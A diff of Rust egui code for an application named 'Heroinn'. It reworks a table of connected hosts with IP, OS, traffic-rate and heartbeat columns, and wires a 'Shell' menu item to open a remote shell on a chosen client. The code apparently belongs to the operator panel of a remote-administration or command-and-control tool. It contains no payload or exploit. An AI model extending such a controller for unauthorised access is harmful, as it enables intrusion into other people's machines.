@@ -48,7 +48,7 @@ fn main() {
 	::log::set_max_level(LevelFilter::Info);
     
     let mut options = eframe::NativeOptions::default();
-    options.initial_window_size = Some(egui::Vec2::new(990.0,610.0));
+    options.initial_window_size = Some(egui::Vec2::new(1375.0,610.0));
     eframe::run_native(
         "Heroinn",
         options,
@@ -246,11 +246,11 @@ impl HeroinnApp {
         TableBuilder::new(ui)
             .striped(true)
             .cell_layout(egui::Layout::left_to_right().with_cross_align(egui::Align::Center))
-            .column(Size::initial(320.0).at_least(40.0))
-            .column(Size::initial(320.0).at_least(40.0))
-            .column(Size::initial(100.0).at_least(40.0))
-            .column(Size::initial(100.0).at_least(40.0))
-            .column(Size::initial(100.0).at_least(40.0))
+            .column(Size::initial(320.0).at_least(50.0))
+            .column(Size::initial(320.0).at_least(50.0))
+            .column(Size::initial(100.0).at_least(50.0))
+            .column(Size::initial(488.0).at_least(50.0))
+            .column(Size::initial(100.0).at_least(50.0))
             .resizable(self.resizable)
             .header(20.0, |mut header| {
                 header.col(|ui| {
@@ -306,24 +306,29 @@ impl HeroinnApp {
         TableBuilder::new(ui)
             .striped(true)
             .cell_layout(egui::Layout::left_to_right().with_cross_align(egui::Align::Center))
-            .column(Size::initial(50.0).at_least(40.0))
-            .column(Size::initial(120.0).at_least(40.0))
-            .column(Size::initial(120.0).at_least(40.0))
-            .column(Size::initial(140.0).at_least(40.0))
-            .column(Size::initial(100.0).at_least(40.0))
-            .column(Size::initial(100.0).at_least(40.0))
-            .column(Size::initial(150.0).at_least(40.0))
-            .column(Size::initial(130.0).at_least(40.0))
+            .column(Size::initial(50.0).at_least(50.0))
+            .column(Size::initial(120.0).at_least(50.0))
+            .column(Size::initial(150.0).at_least(50.0))
+            .column(Size::initial(150.0).at_least(50.0))
+            .column(Size::initial(210.0).at_least(50.0))
+            .column(Size::initial(100.0).at_least(50.0))
+            .column(Size::initial(100.0).at_least(50.0))
+            .column(Size::initial(100.0).at_least(50.0))
+            .column(Size::initial(150.0).at_least(50.0))
+            .column(Size::initial(150.0).at_least(50.0))
             .resizable(self.resizable)
             .header(20.0, |mut header| {
                 header.col(|ui| {
                     ui.heading("");
                 });
                 header.col(|ui| {
-                    ui.heading("IP");
+                    ui.heading("Peer IP");
                 });
                 header.col(|ui| {
-                    ui.heading("HostName");
+                    ui.heading("Network Card IP");
+                });
+                header.col(|ui| {
+                    ui.heading("Host Name");
                 });
                 header.col(|ui| {
                     ui.heading("OS");
@@ -332,7 +337,10 @@ impl HeroinnApp {
                     ui.heading("Protocol");
                 });
                 header.col(|ui| {
-                    ui.heading("Location");
+                    ui.heading("In Rate");
+                });
+                header.col(|ui| {
+                    ui.heading("Out Rate");
                 });
                 header.col(|ui| {
                     ui.heading("Last Heartbeat");
@@ -343,16 +351,20 @@ impl HeroinnApp {
             })
             .body(|mut body| {
 
-                let menu = |ui : &mut egui::Ui| {
-                    if ui.button("Shell").clicked() {
-                        ui.close_menu();
-                    }
-                    if ui.button("File").clicked() {
-                        ui.close_menu();
-                    }
-                };
-
                 for info in all_host() {
+
+                    let clientid = info .clientid.clone();
+
+                    let menu = |ui : &mut egui::Ui| {
+                        if ui.button("Shell").clicked() {
+                            open_shell(&clientid);
+                            ui.close_menu();
+                        }
+                        if ui.button("File").clicked() {
+                            ui.close_menu();
+                        }
+                    };
+
                     let row_height = 30.0;
                     body.row(row_height, |mut row| {
 
@@ -360,6 +372,10 @@ impl HeroinnApp {
                             ui.add(
                                 egui::Image::new(self.host_image.texture_id(ctx), egui::Vec2::new(30.0, 30.0))
                             );
+                        }).context_menu(menu);
+
+                        row.col(|ui| {
+                            ui.label(format!("{}", info.peer_addr));
                         }).context_menu(menu);
 
                         row.col(|ui| {
@@ -374,9 +390,19 @@ impl HeroinnApp {
                         row.col(|ui| {
                             ui.label(format!("{:?}", info.proto));
                         }).context_menu(menu);
+
                         row.col(|ui| {
-                            ui.label("CHINA UNICOM");
+                            let secs = cur_timestamp_secs() - info.last_heartbeat;
+                            let in_rate = info.in_rate / (secs + HEART_BEAT_TIME);
+                            ui.label(format!("{} byte/s", in_rate));
                         }).context_menu(menu);
+
+                        row.col(|ui| {
+                            let secs = cur_timestamp_secs() - info.last_heartbeat;
+                            let out_rate = info.out_rate / (secs + HEART_BEAT_TIME);
+                            ui.label(format!("{} byte/s", out_rate));
+                        }).context_menu(menu);
+
                         row.col(|ui| {
                             let secs = cur_timestamp_secs() - info.last_heartbeat;
                             if secs > 30 {
@@ -385,7 +411,7 @@ impl HeroinnApp {
                             ui.label(format!("{}" , secs));
                         }).context_menu(menu);
                         row.col(|ui| {
-                            ui.label("Test host");
+                            ui.label(info.info.remark);
                         }).context_menu(menu);
                     });
                 }
